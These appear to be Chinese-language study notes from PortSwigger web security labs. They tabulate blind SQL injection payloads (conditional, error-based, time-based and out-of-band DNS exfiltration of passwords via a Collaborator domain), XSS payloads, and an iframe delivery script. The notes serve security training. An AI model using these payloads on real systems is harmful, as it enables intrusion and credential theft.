# Lab Lessons - PortSwigger 实战经验

## 2026-07-05: SQLi 盲注 + XSS + SSTI

### SQLi 盲注技术总结

| 技术 | 数据库 | Payload | 关键点 |
|------|--------|---------|--------|
| 条件响应 | PostgreSQL | `' AND SUBSTRING(...,1,1)='a'--` | 检查 "Welcome back" 出现 |
| 条件错误 | Oracle | `' AND (SELECT CASE WHEN cond THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--` | 500=true, 200=false |
| 可见错误 | PostgreSQL | `CAST((SELECT MIN(password) FROM users) AS int)` | 错误消息直接泄露密码 |
| 时间延迟 | PostgreSQL | `' \|\| pg_sleep(10)--` | 响应延迟确认注入 |
| 时间提取 | PostgreSQL | `CASE WHEN SUBSTR(...,1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END` | 逐字符提取 |
| OOB 交互 | Oracle | `UTL_INADDR.GET_HOST_ADDRESS('domain')` | DNS 查询到 Collaborator |
| OOB 泄露 | MSSQL | `xp_dirtree '\\'+(SELECT password)+'.'+collab+'\a'` | 密码嵌入 DNS 子域名 |

### XSS 技术总结

| 场景 | Payload | 关键点 |
|------|---------|--------|
| DOM hashchange | `#<img src=x onerror=print()>` | iframe.src = sameURL + '#hash' 触发 |
| href 属性 | `javascript:alert(1)` | 双引号编码不影响 javascript: 协议 |
| JS 字符串 | `'-alert(1)-'` | ' 在 script 标签内不被 HTML 编码 |

### Exploit Server 投递技巧

```javascript
// DOM hashchange XSS: iframe 方案（最可靠）
<iframe id="f" src="https://lab-url/"></iframe>
<script>setTimeout(function(){
  document.getElementById("f").src="https://lab-url/#<img src=x onerror=print()>";
},3000);</script>
```

### 工具使用教训

1. **先用工具再手动** — auto_ssrf/auto_xss/auto_ssti 都有，打靶前先跑
2. **注入点在 Cookie** — PortSwigger 盲注 lab 用 TrackingId cookie
3. **浏览器登录用 Playwright** — Burp POST 登录成功但 lab 不算 solved
4. **w.location.hash 跨域被 block** — 用 iframe.src 方案替代
